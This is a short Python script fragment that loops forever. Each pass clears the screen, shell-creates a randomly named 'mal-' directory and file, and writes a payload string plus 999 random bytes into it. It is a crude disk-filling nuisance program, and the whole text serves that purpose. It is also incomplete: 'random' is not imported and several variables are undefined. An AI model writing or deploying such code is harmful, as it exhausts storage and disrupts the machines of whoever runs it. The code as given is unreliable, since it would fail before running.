import os
mal = True
while mal == True:
    random1 = random.choice(randomlet)
    random2 = random.choice(randonum)
    random3 = random.choice(randonum)
    random4 = random.choice(randonum)
    os.system("clear")
    directory = "mal-" + random1 + str(random2) + str(random3) + str(random4)
    os.system("mkdir " + directory)
    os.system("touch " + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4))
    with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
      file.write(malwar + str(random.randbytes(999)))
    print(malwar)
